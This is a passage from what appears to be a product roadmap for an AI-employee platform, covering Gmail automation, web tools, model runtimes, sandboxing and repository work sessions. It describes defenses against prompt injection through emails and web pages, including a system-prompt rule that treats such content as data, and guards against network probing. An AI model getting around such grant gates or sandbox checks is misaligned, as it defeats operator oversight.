      omitted; each playbook is fetched via `/skills/:sid/readme`.
- [x] `PATCH /skills/:sid` renames a skill, leaving the slug alone so
      links stay stable (this is what M4's "rename" claimed and never had)
- [x] Skills index: per-employee sidebar filter, free-text search over
      skill name and employee, known-by column
- [x] Skill detail at `/skills/:empSlug/:skillSlug` — two slug segments
      because a skill slug is unique only per-employee — with Playbook /
      Settings tabs. ⌘S saves the playbook, as the docs always claimed.
- [x] The employee Skills tab redirects to the company list filtered to
      that employee

### M27 — Company resource tags ✅

Reusable company labels for grouping resources without forcing a folder
hierarchy. Tags are case-insensitive within one company, free-form, and many
can be attached to the same resource.

- [x] `Tag` catalog plus polymorphic `TagAssignment` rows, with company
      ownership checks for Routines, Skills, Resources, Projects, Bases,
      Notebooks, Notes, Pipelines, Repositories, Charts, and Dashboards
- [x] Member-facing tag CRUD at **Settings → Tags**, including usage counts;
      renames update attached Resources and deletes detach without deleting
      the underlying resource
- [x] Multi-tag picker on all supported resource detail flows, plus create
      flows for Routines, Skills, and Resources, with inline creation of any
      new company tag
- [x] Tag chips and filters on the company-wide Routines, Skills, and
      Resources lists
- [x] Curated tag colors across chips, filters, and pickers, with color
      management in Settings and random colors assigned to existing tags
- [x] Existing comma-separated M18 Resource tags import into the company
      catalog on boot; the legacy string stays synchronized for MCP search and
      backwards-compatible Resource tools

### M25 — Email (agentic Gmail client) ✅

A top-level **Email** section: connect a Gmail account through the existing
Google integration, read and act on the mailbox like a mail client, and hand
threads to AI employees — on demand or automatically when mail arrives.
Distinct from the transactional **EmailProvider / EmailLog** subsystem (which
sends system mail); this is the company's real inbox. Internal namespace is
`Mail*` / `/api/companies/:cid/mail` so the two never collide.

- [x] **Entities.** `MailAccount` (rides on a `google` IntegrationConnection
      whose consent included the Gmail scope group; stores address, sync
      cursor `historyId`, status), `MailThread` + `MailMessage` (local mirror
      of the mailbox: headers, text + HTML bodies with size caps, label ids,
      attachment metadata), `MailLabel` (system + user labels),
      `MailRule` (automation on inbound mail), `MailHandover` (one thread
      handed to one AI employee with a status lifecycle), and
      `EmployeeMailAccountGrant` with three escalating capabilities
      `read` < `draft` < `send` (default `draft`: an employee can triage and
      write drafts, but a human presses Send).
- [x] **Two-way sync** (`services/mail/`). 30s heartbeat poller (same shape
      as cron.ts) per active account. The first import walks the **entire
      mailbox** newest-first — resumable across passes via a persisted
      `backfillPageToken` cursor + `backfilledCount` progress, so a large
      account imports fully in the background without blocking or flooding
      the API — then `history.list` incremental sync from the stored
      `historyId` (re-anchors with a fresh import + stale-row prune when
      Gmail expires the cursor). Errored accounts self-heal on a slower
      retry cadence rather than parking forever. Every action taken in
      Genosyn — read/unread, star, archive, trash, label, draft, send —
      writes through to the Gmail API first and re-syncs the affected
      messages, so Gmail and Genosyn stay consistent both ways. No Pub/Sub
      dependency: polling keeps self-hosted installs zero-config.
- [x] **Resilient reconnect and recovery.** Settings → Email can refresh the
      existing Google Connection without deleting the local mirror, rules, or
      grants. Reconnects retain the same mailbox identity and Gmail capability,
      serialize with mailbox attachment, and cannot be overwritten by a stale
      in-flight credential refresh; transient Gmail reads retry safely while
      durable sync, automation, and draft-queue state recover after restarts.
- [x] **Mail client UI** under `/c/<co>/mail`: folder + label sidebar with
      unread counts and import progress, thread list with **full-body
      search** (subject, participants, and message text via a portable
      EXISTS subquery), thread view (sanitized HTML bodies via DOMPurify —
      remote images blocked in the DOM until clicked, inline data:/cid
      images allowed), compose / reply / reply-all / **forward**,
      **outbound attachments** (staged upload + multipart/mixed MIME),
      inbound attachment download, drafts (including drafts AI employees
      wrote — edit then send), per-thread actions, account settings. The
      goal: never open Gmail to work the inbox.
- [x] **Paced bulk draft sending.** A confirmed Drafts selection enters a
      durable queue that sends one email at a time with a fresh random
      one-to-two minute pause between attempts. The Drafts page hides queued
      drafts from the review list, accepts newly approved drafts while sending,
      and shows sent / failed / remaining progress plus next-send and approximate
      whole-queue ETAs. Progress clears automatically on completion, and restart
      recovery preserves the pace.
- [x] **Hand to AI.** "Hand to AI" on any thread picks a granted employee,
      an instruction, and a mode: `draft` (employee writes a Gmail draft
      into the thread for human review), `reply` (employee sends —
      requires the `send` grant), or `triage` (employee labels / archives /
      flags). Handovers run through the chat seam (`chatWithEmployee`) on a
      small in-process queue; status + result surface in the thread view
      and the Handovers page, with bell notifications on completion/failure.
- [x] **Rules.** Per-account automation evaluated on every new inbound
      message the sync ingests: static conditions (from / to / subject / body
      contains, has attachment) can optionally prefilter an AI employee's
      natural-language judgment, then matching mail runs ordered actions
      (apply label, mark read, star, archive, standards-only HTTPS one-click
      unsubscribe, or hand to an AI employee with an instruction + mode).
      AI matching requires a connected model and at least read access to the
      mailbox; unsubscribe requires Gmail-confirmed DKIM coverage, rejects
      redirects, never follows body links, and asks for confirmation when the
      enabled rule is saved. Scheduled email work (inbox digests etc.) needs no
      new machinery — Routines can call the mail tools.
- [x] **MCP surface.** `list_mail_accounts`, `search_mail` (full-body index
      search with from / to / date / label / attachment filters),
      `get_mail_thread`, `create_mail_draft`, `update_mail_thread`,
      `send_mail` — grant-gated per account + capability, collapsed into a
      single `mail` family tool for the agent. AI writes record AuditEvent +
      JournalEntry like every other MCP write.
- [ ] Gmail Pub/Sub push (instant sync) — deferred; polling is the
      self-host-friendly default
- [ ] Forwarding original attachments (re-fetch + re-stage) and send-as
      aliases — deferred (forwarded body notes original attachment names)
- [x] **The grant levels bind every route to the mailbox.** The Google
      connector's `gmail_*` tools reach the same account with the same
      token, and originally honoured only the Connection grant — which made
      the `draft` default advisory, since an employee could just send
      through the integration surface instead. They now answer to the same
      `EmployeeMailAccountGrant` levels via an `assertCapability` closure
      the dispatcher binds to the caller (`services/connectionCapabilities.ts`),
      mapping read/draft/send onto the five `gmail_*` tools. A connection
      with no `MailAccount` is ungoverned and still passes — there is no
      level to enforce until a human connects the mailbox.
- [ ] Retire the `gmail_*` compose tools in favour of `send_mail` /
      `create_mail_draft`. The blocker is cleared: both native tools now take an
      `attachments` list resolved through `makeResourceAttachmentResolver`
      (Resources by slug, plus **invoices rendered to PDF** by slug, gated on
      the finance grant), so an employee can reply on a billing thread —
      recipient and CCs preserved — with the invoice attached. The `gmail_*`
      compose tools keep working (they share the same resolver, so invoice
      attachments reached them too); merging the two surfaces is the remaining
      step. Two compose surfaces over one mailbox is a standing drift risk; the
      gate above keeps them consistent but does not merge them.
- [ ] Approval-gated `send_mail` (Approval kind `mail_send`) — deferred;
      the `draft` grant level is the human gate today
- [x] **Sync resilience + live import.** The backfill checkpoints its page
      cursor after every page (a caught error or hard crash resumes from the
      last completed page, never from scratch), skips threads deleted
      between listing and fetch instead of stalling the import, and every
      mid-import pass ALSO replays the history log first — so new mail
      shows up (and rules fire) within a heartbeat even while a huge
      mailbox is still importing. Un-pausing an account syncs immediately
      instead of waiting for the next heartbeat.
- [x] **Search grammar** (`services/mail/searchQuery.ts`) shared by the
      thread-list search box and the `search_mail` tool: terms AND together
      across subject/participants/snippet/body/addresses, quoted phrases,
      and Gmail-style operators — `from:` `to:` `subject:` `label:`
      `in:inbox|archive|sent|drafts|all|spam|trash` `has:attachment`
      `is:unread|read|starred` `before:`/`after:`. A search covers all mail
      (minus spam/trash) rather than the folder being viewed; `in:` narrows
      back down. The search box gets a `/` shortcut, a clear button, an
      operator cheat-sheet popover, a result-count header, and term
      highlighting in the result rows.
- [x] **Per-email AI chat** — every opened thread and Drafts review item has
      an always-visible chat panel (`MailAssistant`, one independent
      conversation per `MailThread` on `MailChatMessage`); there is no global
      mailbox assistant. Tag any AI employee with `@slug` (sticky within that
      email until somebody else is tagged), and the turn runs through the chat
      seam with the mailbox + opened thread injected as context
      (thread contents only when the employee holds a `read` grant).
      Draft-focused chats also identify the draft in front of the human, and
      the grant-gated `edit_mail_draft` / `mail` op `edit` replaces that Gmail
      draft in place, so natural-language edits need no extra UI action.
      Replies carry **action pills** (what the employee did, from
      AuditEvents) and **suggestion buttons** — structured next steps the
      employee proposes via the new `suggest_mail_actions` tool (op
      `suggest` on the `mail` family): open a pre-filled reply, send a
      draft, triage, open a thread, start a handover, or create an inbox
      rule. Buttons execute through the ordinary human routes with the
      human's own authority — so a `draft`-level employee can _propose_ a
      send the human approves with one click — and consuming buttons are
      stamped executed server-side so a reload can't re-arm them.
- [x] **Files in the per-email chat, both directions.** The panel was
      text-only, so an employee could see "FIF_2026.pdf" listed on a thread,
      have no way to open it, and end up asking the human to download and
      re-upload a file the mailbox already held. Now:
      `read_mail_attachment` (messageId + the attachment `index` that
      `get_mail_thread` and the injected thread context both carry) fetches
      the bytes from Gmail and records them as an ordinary chat `Attachment`,
      so every tool that speaks `attachmentId` — `read_pdf_fields`,
      `fill_pdf_form`, `send_chat_attachment`, and the compose tools'
      `attachments` list — works on an email attachment. Files the employee
      produces bind to its `MailChatMessage` and render as download chips on
      the reply; humans can upload into the panel with the same plumbing every
      other chat surface uses. `create_mail_draft` / `send_mail` /
      `edit_mail_draft` accept `{attachmentId}` specs, so a filled form goes
      out on the reply itself. Reach is deliberately narrow: a turn may use
      what it produced or opened (tracked per MCP token), what the requesting
      Member uploaded, or what is bound to that mailbox's shared chat —
      never an arbitrary row in the company's attachment table.
- [x] **Per-email model selection.** `MailChatMessage.modelId` records the
      brain each turn ran on, the roster carries each employee's connected
      models, and the panel offers a picker that defaults to the active model
      and stays on whichever model last answered — the same "don't swap brains
      mid-thread" rule employee chat follows. A pick that doesn't belong to the
      employee now on the conversation falls back to their active model rather
      than failing the turn.
- [x] **Every inbound email arrives triaged.** A `MailInboundAnalysis` row per
      new message, written by the inbound automation queue before rules and
      Pipelines run: a category from a closed vocabulary, one scannable
      summary line, and up to four **action buttons** the email actually
      earned — draft the reply (already written), raise the draft invoice or
      estimate from line items read out of the mail, unsubscribe, triage the
      thread, or hand it over. On by default per mailbox
      (`MailAccount.aiAnalysisEnabled`), with an optional employee and pinned
      model; unconfigured mailboxes borrow the granted employee with the
      highest access, so a mailbox works the day it is connected.
      The turn runs on `runRestrictedEmployeeAgent` with exactly one
      submission tool, the same containment the AI rule condition uses. The
      model never names a target — the thread and message come from the
      server — and it cannot choose its own affordances: whether Unsubscribe
      may even be offered is decided by the same RFC 8058 checks the click
      will run. Buttons execute through the ordinary human routes with the
      pressing Member's authority, show the server-verified fact beneath the
      model-authored label, and are stamped executed so a reload can't re-arm
      them.

### M38 — Web tools (search, read, download) ✅

An employee that can only see company data stops at "I need the current blank
form". Three tools close that, with no browser and no per-employee toggle:
`search_web`, `fetch_web_page` (HTML / text / JSON / PDF extracted to text),
and `download_web_file`, which lands the file as a chat attachment so the PDF
and mail tools can pick it straight up — find the form, fill it, attach it to
the reply.

- [x] **One network path.** Everything goes through `lib/outboundUrl.ts`:
      http(s) only, no embedded credentials, every redirect hop re-resolved
      and refused if it lands on a private, loopback, link-local, or
      cloud-metadata address. A link from a hostile email cannot turn an
      employee into a probe of the operator's internal network.
- [x] **Untrusted by construction.** Every result is labelled as third-party
      content, and the system prompt says plainly that attachments, pages, and
      email bodies are data — text inside them addressing the model is the
      document's author talking, not the teammate.
- [x] **Operator controls** at **Admin → Runtime** (`web.enabled`,
      `web.searchProvider`, size and text caps — in `config.ts` until they
      became database-backed runtime settings). Search defaults to
      DuckDuckGo's no-JavaScript HTML endpoint — the only backend a
      self-hosted install can ship with no account and no API key. The parser
      is isolated and covered against captured markup so an upstream change
      surfaces as a failing test rather than silently empty results.
- [ ] A keyed search backend (Brave, Google CSE) for operators who get rate
      limited — the provider seam is in place; only the adapter is missing.

### M6 — AI Models (employee-owned) ✅

> **Superseded by M22.** The generic provider-CLI harnesses, subscription
> sign-in, and persistent per-provider config materialization below were
> removed in M22. M22 later gained one deliberately narrow exception: trusted
> single-tenant OpenAI subscription access through the official Codex
> app-server. That is not a revival of the provider-harness architecture. The
> employee-owned / one-active model remains.

- [x] `AIModel` employee-owned — many per employee, exactly one active
      (`AIModel.isActive`, newest-added active by default, switchable any time);
      runner + non-interactive chat surfaces run the active one, while direct
      employee Chat can choose another connected model per message
- [x] Provider-specific setup for claude-code / codex / opencode / goose
- [x] Subscription sign-in flow (UI polls for credentials file)
- [x] API-key flow with AES-256-GCM encryption
- [x] Runner spawns provider CLI in employee cwd with scoped env
- [x] CLI install + sign-in flow brought into the browser
- [x] Disconnect deletes DB row and wipes credentials
- [x] `openclaw` provider added (apikey-only)
- [x] OpenClaw built-in `genosyn` MCP server (read-merge-write of the
      `mcp.servers` block inside openclaw.json)

### M22 — Direct model APIs (harnesses removed) ✅

- [x] At initial M22 delivery, removed the five provider-CLI harnesses
      (`claude-code`, `codex`, `opencode`, `goose`, `openclaw`) — providers
      became `anthropic`, `openai`, `custom` (OpenAI-compatible), with
      `authMode: "apikey" | "customEndpoint"`
- [x] In-process agent runtime (`server/services/agent/`): a provider-agnostic
      tool-use loop over the Anthropic Messages API, OpenAI Chat Completions,
      and OpenAI-compatible custom endpoints, with native streaming
- [x] Bounded transient model retries: five total attempts with exponential
      jitter and `Retry-After` support, cancelled with the parent turn and
      never replayed after visible output starts
- [x] Tools provided directly to the model: mode-dependent built-in coding
      tools (none when disabled, path-confined file helpers in acknowledged host
      mode, or sandboxed bash in bubblewrap), the genosyn tools (dispatched
      in-process over loopback), browser tools (bridged from the built-in stdio MCP child),
      and company-configured MCP servers (HTTP in the safe disabled/bubblewrap
      modes; stdio is also available in trusted single-tenant host mode)
- [x] **Bounded parallel delegation.** Chat turns and Routine runs expose
      `delegate_parallel_work`: one AI Employee can run up to four temporary
      copies of itself concurrently (eight briefs per call, twelve per turn),
      then verify and synthesize their ordered results. Workers inherit the
      same Soul, Skills, AI Model, Grants, secrets, working directory, and
      timeout; recursion stops after one level. Subscription turns omit this
      tool because managed ChatGPT credential refresh serializes Runs on the
      model lock.
- [x] At initial M22 delivery, dropped subscription/OAuth sign-in, the
      in-browser pty install/login surface, node-pty, and the persistent
      per-provider credential dirs; model credentials live encrypted on
      `AIModel.configJson`
- [x] Data migration remapping existing rows onto the new provider/authMode
      vocabulary
- [x] **OpenAI subscription access, without reviving provider harnesses.**
      Trusted single-tenant OpenAI models may use `authMode: "subscription"`
      through the official pinned `@openai/codex` app-server; a Member
      completes ChatGPT device sign-in or supplies a Business / Enterprise
      Codex access token. Anthropic subscription credentials are explicitly
      unsupported.
- [x] **Ephemeral credential boundary.** Subscription credentials remain
      encrypted on `AIModel.configJson`. Login and Run processes materialize
      managed sessions only inside a locked temporary `CODEX_HOME` and inject
      access tokens only into the child environment. They remove the directory
      afterward and never place credentials in the employee working tree or a
      persistent provider directory. Cleanup retries and startup removes stale
      Genosyn Codex temp directories.
- [x] **Subscription tool isolation.** Working bubblewrap is the shipped
      default and permits subscription sign-in and Runs alongside `bash` and
      repository work behind private PID and `/tmp` namespaces. Where the
      sandbox cannot start, boot falls back to safe disabled mode, which
      supports the same sign-in and Runs without coding tools, repository
      materialization, or user-configured stdio MCP children.
      Host-process file tools are omitted install-wide in bubblewrap so a
      concurrent API-key or custom-model turn cannot win a symlink race into
      the subscription credential. Every server-managed Git command that
      touches an AI-writable checkout runs through that namespace, with a
      cleared environment, executable Git settings overridden, and only the
      configured remote fetched. User-configured stdio MCP children are omitted
      in disabled and bubblewrap modes; HTTP MCP and the audited built-in browser
      remain available. Host mode permits user stdio children and therefore
      rejects subscription auth.
- [x] **Single-tenant boundary.** Model create/update, sign-in, and execution
      reject subscription auth when `config.security.multiTenant` is true.
      Shared SaaS uses API keys; API-key and custom-endpoint models continue
      through the direct in-process agent loop.
- [x] **Subscription lifecycle hardening.** Per-model turns reload credentials
      under a refresh lock; credential refresh and device completion use
      compare-and-swap updates; login starts are reserved per model and capped
      per process; process exit, abort, and a hard deadline all force cleanup.
      Device completion also rechecks the initiating Member's admin role.

### M7 — Chat + Workspace ✅

- [x] Top-nav sections with context-specific sidebars
- [x] Per-employee sub-nav (Chat / Workspace / Soul / Skills / Settings /
      Connections / Handoffs / Journal)
- [x] Persisted conversations (`Conversation` + `ConversationMessage`),
      action pills rendered from `actionsJson`
- [x] Direct-chat follow-up queue: the composer stays editable during a reply,
      shows queued messages inline, and releases them serially when the AI
      Employee finishes
- [x] Interrupt and send: a Member can stop the reply in flight so a queued
      follow-up goes next instead of waiting the employee out. The stopped
      turn keeps whatever it had already streamed, is marked `interrupted`
      rather than failed, releases the employee's reply lease, and is left
      terminal so recovery never resumes it
- [x] Concurrent conversations with one AI Employee: the reply lease and the
      browser's send queue are scoped to the thread — a conversation, an email
      thread, a TLDR question, a Todo, a workspace channel — so only a second
      message in the *same* thread waits, and separate chats with one employee
      reply in parallel
- [x] Per-message AI Model picker in direct employee Chat when multiple models
      are connected; defaults to the active model and persists each queued
      turn's choice through disconnect and server-restart recovery
- [x] Employee-authored live progress in direct chat: substantial multi-step
      turns can publish labelled, monotonic percentage updates over the
      existing reply stream, while quick replies keep the typing indicator
- [x] Durable long-running direct-chat turns: persist the working reply and
      latest milestone, recover through stream disconnects and page reloads,
      resume after server restarts through renewable database worker leases,
      guard recovered work against repeated side effects, keep follow-ups
      queueable, and allow up to six hours per turn across every attempt
- [x] Context-window gauge in direct chat: the composer shows what share of the
      AI Model's window the last turn's prompt occupied, measured from the
      provider's own token counts rather than a local estimate, persisted per
      message so a reload or a turn recovered in another process still reports
      it, warning at the same 80% threshold the Run transcript uses, and
      degrading to a plain token count (linked to the model settings) when the
      model publishes no window
- [x] Workspace file editor with path-traversal guards, 2 MiB text-only cap

### M8 — Polish + QA ✅

- [x] Browser-tested flows
- [x] Empty / loading / error states everywhere
- [x] README + self-host docs + CLI installer

### M9 — Workspace Chat (Slack-style) ✅

- [x] Public + private channels per company
- [x] DMs (idempotent pairing)
- [x] In-process WebSocket hub at `/api/ws` (auth via short-lived token)
- [x] Emoji picker + reactions
- [x] File uploads (multer, 25 MB cap)
- [x] `@employee-slug` mentions auto-invite + reply via `streamChatWithEmployee`
- [x] AI DMs reply on every message
- [x] DM archiving (including automatic archive when an AI employee is
      deleted), `/new` context boundaries, and `#` references across every
      AI-employee chat composer. References cover both visible company rows and
      stable product areas (Estimates, Invoices, Workspace, Contacts, …); each
      selected tag stays clickable and adds a safe tool-discovery hint to the
      AI turn, with multiple targets supported and existing Grants unchanged
- [x] Unread badges + read markers
- [x] Recent-first message history with upward-scroll pagination and visible
      loading states
- [x] Edit / soft-delete own messages, broadcast over WS
- [x] Per-channel Slack-compatible incoming webhooks, configured from channel
      settings with copy, regeneration, and disable controls
- [ ] Typing indicators UI (plumbing exists, UI deferred)
- [ ] Threaded replies UI (column exists, UI deferred)
- [ ] Search, link unfurls, desktop notifications

### M10 — Pipelines ✅

- [x] `Pipeline` + `PipelineRun` entities, per-company DAG
- [x] Node catalog: triggers (manual / webhook / schedule), Genosyn actions
      (sendMessage / createTodo / createProject / createBaseRecord /
      askEmployee / journalNote), logic (http / set / branch / delay) and
      `integration.invoke` for any provider tool
- [x] Executor service with topo-walk + per-run log
- [x] `tickPipelines()` heartbeat + webhooks at
      `/api/webhooks/pipelines/:pipelineId/:token`
- [x] Custom React canvas editor (no react-flow), side-panel node config,
      run-history tab
- [x] Guided builder UX overhaul: client-side readiness checks
      (`getPipelineIssues` — missing trigger, broken edges, invalid
      cron/JSON, cycles) driving Needs setup / Ready / Paused badges,
      `startWith` starters (manual / schedule / webhook) seeded at create,
      resource pickers fed by live company data, an Integration-step
      action picker from the catalog's `integrationTools`, and a docs
      page at `/docs/pipelines`
- [x] MCP tools — list_pipelines, get_pipeline, list_pipeline_node_types,
      create_pipeline, update_pipeline, delete_pipeline, run_pipeline,
      list_pipeline_runs, get_pipeline_run, rotate_pipeline_webhook_token.
      AI Employees author Pipelines, not just run inside them: the step
      library is served as JSON, graphs are structurally validated before
      the write (unknown step type, invalid cron, dangling connection,
      wrong branch handle) instead of failing mid-run, and canvas
      coordinates are laid out server-side so an author never invents them
- [x] Employee authoring authority (`services/pipelines/authoring.ts`) —
      a Pipeline runs as the company, so every step an employee writes is
      intersected with that employee's own Grants at save time: Base
      grant, Project access, private-channel membership, Connection grant
      plus the strongest capability the Connection can be asked for, and
      and named mailboxes plus read on each for the email trigger — which
      gained a `mailboxes` scope so that answer stays true when a mailbox
      is connected later. The predicate
      is whole-graph rather than per-edit — a step reads
      `{{other-step.field}}` at run time, so an untouched Connection step
      is still steerable from upstream — and it also guards everything
      that *acts on* a graph: every write (including rename and pause),
      running, deleting, reading a Run's payload and outputs, and being
      handed a Webhook trigger's URL. Listing and reading stay open, minus
      the webhook secret. Writes carry the `admin` interactive-Member
      policy, matching the human route
- [x] `logic.code` — Run JavaScript step: Member-authored source runs in a
      per-step worker thread (hard time + memory bounds) with a
      `genosyn.base` record SDK (create / query / update / delete,
      field-name or field-id keyed) and an axios-style HTTP client routed
      through the outbound-URL guard. The step carries company-wide
      authority, so employee authoring treats it as beyond any employee's
      Grants

### M11 — Notes (Notion-style) ✅

- [x] `Note` + `Notebook` with parent self-reference, archive, split
      author bookkeeping
- [x] CRUD + search routes, tree reorder, parent reparenting with cycle
      protection, restore from trash
- [x] Notion-style sidebar tree, per-row "+" sub-page button, trash toggle
- [x] Editor with title + emoji icon, MarkdownEditor with ⌘S, breadcrumbs,
      "…" menu
- [x] MCP tools — `list_notes`, `search_notes`, `get_note`, `create_note`,
      `update_note`, `delete_note`. AI writes record `AuditEvent` +
      `JournalEntry`.

### M11.5 — Base record detail ✅

- [x] `BaseRecordComment` + `BaseRecordAttachment` entities
- [x] CRUD + download endpoints; multer 25 MB human cap, 5 MB AI cap
- [x] Side drawer in `BaseDetail.tsx` with form + comment thread + files
- [x] MCP tools — `get_base_record`, comment CRUD, attachment CRUD
- [x] Table archive, restore, and permanent-delete controls; archived tables
      stay available to Members but are excluded from AI Employee schemas,
      row tools, record detail, Base Assistant context, and automation writes

### M11.6 — Record link columns + record pages ✅

- [x] Seven record-link field types — `customer`, `invoice`, `project`,
      `employee`, `member`, `note`, `pipeline` — so Base columns can point
      at records across Genosyn; cells store arrays of ids, no config and
      no migration (field `type` is a varchar)
- [x] `buildResourceOptionsFor` in `services/baseResources.ts` resolves
      ids → label / sublabel / deep-link URL per product. Restricted
      projects are filtered per viewer; archived customers and notes stay
      resolvable in existing cells but hidden from pickers
- [x] Grid, drawer, and view filters: chips deep-link to the target
      record, searchable pickers, `has any of` / `has none of` operators
- [x] Full-page record view at `/bases/<base>/<table>/r/<id>` — every
      column viewable and editable, comments + attachments, delete;
      the drawer's "Open full page" button links to it
- [x] MCP surface: record-link types in `add_base_field`;
      `list_base_rows` / `get_base_record` return a capped
      `resourceOptions` map so agents write valid ids
- [x] First dedicated Bases docs page (`/docs/bases`)

### M12 — Engineering Repos ✅

- [x] GitHub Connection extended with OAuth + GitHub App auth modes
      (`github-oauth.ts`, `github-app.ts`) on top of existing PAT
- [x] Per-Connection `repos[]` allowlist on `encryptedConfig.repos`
- [x] `services/repoSync.ts` materializes git checkouts under
      `<employeeDir>/repos/<owner>/<name>/` before each spawn; per-employee+
      connection mutex; fetch-only on existing checkouts (won't trample WIP)
- [x] GitHub tokens stay inside short-lived server-owned clone/fetch
      operations. Checkouts contain no reusable helper, token, or credentialed
      push path, so model tools cannot export the Connection credential
- [x] `create_pull_request` MCP tool on the github provider
- [x] Settings → Integrations UI for GitHub repo allowlist editing
- [x] Workspace tree shows materialized `repos/` subtree
- [ ] Default Engineering skill body template (still attached manually)
- [ ] Worktree-per-routine isolation (deferred — single-mutex is fine for now)
- [ ] Signed commits via the GitHub App identity (deferred)

### M21 — Repositories ✅

Provider-agnostic cousin of M12. Where M12's repos ride on a GitHub
**Connection** + allowlist, a **Repository** is a first-class
company row pointed at _any_ git URL (GitHub, GitLab, Bitbucket,
self-hosted) over HTTPS or SSH, with access handed out per-employee.
"Add any repo; let the employees you choose work in a real checkout."

- [x] `Repository` entity — companyId, name, slug, gitUrl,
      defaultBranch, authMode (`none` | `https` | `ssh`), httpsUsername,
      encrypted token + encrypted SSH key (AES-256-GCM via `lib/secret`),
      committer identity, last-sync health. Credentials never returned to
      the client in plaintext.
- [x] `EmployeeRepositoryGrant` — employee → repo with `read` < `write`
      (write records delivery authority; both levels keep credentials out of
      the model shell). Default `write`; sharing is fully opt-in.
- [x] `services/repositories.ts` — `materializeRepositoriesForEmployee` clones
      each granted repo into `<employeeDir>/repositories/<slug>/` before every
      chat / routine spawn; per-(employee × repo) mutex; fetch-only on
      existing checkouts. HTTPS tokens and SSH keys exist only in a
      short-lived server-owned Git workspace; no reusable credential, private
      key, or credentialed push path enters the employee checkout.
      HTTPS GitHub repos without a separately stored token reuse the same
      employee's granted GitHub Connection: exact owner/repo allowlist match
      first, or the employee's sole GitHub Connection when unambiguous. The
      PAT is available only to the server materializer.
      `testRepositoryConnection` probes creds via `git ls-remote --symref`.
- [x] HTTP routes under `/api/companies/:cid/repositories`: CRUD,
      `/test`, grant CRUD + candidates. zod-validated.
- [x] Prompt context — granted repos + their checkout paths and local delivery
      policy injected into the chat / routine prompt; `list_repositories` MCP
      tool on the built-in `genosyn` server.
- [x] React UI under `/c/<co>/repositories`: index (list + add modal), detail
      split into sidebar-addressable Overview, AI access, and Settings pages
      (connection health, per-employee PR readiness, credentials, delete).
      New "Repositories" section under an Engineering group in the app shell.
- [x] Code-delivery guidance — repository context tells employees to branch,
      edit, test, and commit locally, then report the branch and commit for a
      governed server-side or Member publish step. Connection credentials are
      never made available to model-controlled Git.
- [ ] Worktree-per-routine isolation (shared with M12; deferred)

### M21.5 — Repositories become a workspace ✅

M21 gave AI employees a checkout and gave humans a settings page. This turns
the section into something a person actually works in, and widens it past
code: a **Repository** is any version-controlled workspace, including one
created empty inside Genosyn for a quarter's strategy or a set of policies.
"Code" as a section name told everyone who was not an engineer to look away.

- [x] Renamed **Code → Repository** across product copy, URLs
      (`/c/<co>/repositories`), REST (`/api/companies/:cid/repositories`),
      entity and service names, the section registry, search, and docs. The
      physical tables keep their names — see AGENTS.md §7 on generated
      migrations. Tag assignments are repointed by a data migration.
- [x] `Repository.origin` (`remote` | `local`) — a **local** repository is
      created with `git init` and has no clone URL, so version-controlled
      documents need no git host at all. Adding a URL later promotes it.
- [x] `Repository.kind` (`code` | `documents`) — changes copy, editor
      defaults, and how an AI Employee is briefed. Every repository is a
      plain git repository either way.
- [x] **Server-owned checkout** at `.private/repositories/<companyId>/<id>/` —
      the working copy the web UI reads and writes, unreachable by any model
      process, which is what lets it hold a real `origin` and push.
      `services/repositoryWorkspace.ts`.
- [x] `runWorkspaceGit({ serverOwned })` — Git over an App-owned tree skips
      the coding-runtime gate. The gate exists because Git reads executable
      config out of the tree it runs in, which is a model-controlled-tree
      problem; without the exemption the whole section would be unavailable on
      any install whose sandbox could not start and whose execution mode boot
      therefore resolved to `disabled`. Hardening is unchanged, and bubblewrap
      still applies where configured.
- [x] **Web file editor** — tree, editor with line numbers and markdown
      preview, create / rename / delete, per-file and whole-tree diffs
      (untracked files rendered as additions), status, discard.
- [x] **Version control in the browser** — branch create / switch / list,
      commit (attributed to the Member), history with per-commit diff,
      admin-only push and fast-forward pull.
- [x] **AI work sessions** (`RepositoryWorkSession`) — ask a granted employee
      to do work; it runs in its own git **worktree** beside the Member
      checkout, edits through the `repository_*` tools (reading, writing and
      committing need no shell, so that much works with command execution
      off), commits to its own branch, and reports back. The Member reviews
      the diff and merges, optionally pushing. This is the "governed publish
      step" M21's prompt context already promised employees would exist.
- [x] Deferred MCP tools: `repository_list_files`, `repository_read_file`,
      `repository_write_file`, `repository_delete_file`, `repository_search`,
      `repository_run_command`, `repository_commit`. Bounded by the session on
      the turn's MCP token — no repository parameter, and inert outside a
      session.
- [x] **Start a session from chat** (`start_repository_work_session`) — until
      this existed, only the Repository page could open the door those
      tools work behind, so an employee asked in chat to fix something could
      read the repository, explain that it could not begin, and stop. It sends
      only itself, only at a repository it already holds a Grant for, and it
      cannot be reached from inside a session, so sessions cannot nest. The
      session runs detached and the employee answers with a link to the diff:
      a chat turn cannot wait hours, and the outcome has no route back to a
      conversation. A session turn is independent top-level AI work rather than
      a chat reply, so it can overlap with the conversation that started it.
      What a session *is* does not change: its branch still waits for a Member
      to merge or push.
- [x] A session turn is held to the `repository_*` tools at the MCP seam.
      Loading a handful of tools up front never stopped a turn discovering the
      rest, so the session briefing — "nothing you do here affects anyone until
      a human reviews your diff" — was not true of anything outside them. That
      matters more once the instruction can be composed by a model rather than
      typed by a human, and it is also what stops a session starting a session.
- [x] **A session is a conversation, not a single request**
      (`RepositoryWorkSessionTurn`). Every follow-up runs in the *same*
      worktree on the *same* branch with the earlier turns replayed as history,
      so "close, but keep the old heading" costs one sentence rather than a
      fresh session that starts from the trunk and loses everything the
      employee worked out. Only `published` and `discarded` end a session;
      `empty` and `failed` are revisable too, so a session that committed
      nothing or died mid-turn is recoverable rather than wasted. Each turn
      records its own commit range as well as the session's, which is what
      lets a revision be reviewed without re-reading everything before it.
      Sessions predating this are given their first turn on read, so an old
      one reads and revises exactly like a new one.
- [x] **The screen is a session switcher**, in the shape people already know
      from an agentic coding tool: sessions listed on the left, one open on the
      right with its transcript, its diff, its actions, and a composer that
      keeps it going. Every session has its own URL, so switching is
      navigation, a link opens the diff a colleague should look at, and a
      chat-started session links straight to itself. Sessions are titled from
      the instruction that opened them and can be renamed.
- [x] **Repository work opens beside the conversation** — following the link
      an employee replies with used to replace the thread with the Repository
      section: the Member left the conversation to look at a diff and had to
      navigate back to say what they thought of it. Chat now docks the session
      in a resizable panel on the same seam the live browser uses, so the
      transcript, the diff, and the composer that asks for another pass are one
      screen. It is the same `SessionPane` the Repository page renders — one
      set of rules about which of accept / send / open a pull request / throw
      away is offered — and a session started while the Member is reading opens
      itself, exactly as a browser session does. ⌘-click still opens the full
      page, and history is recorded rather than reopened, so returning to an
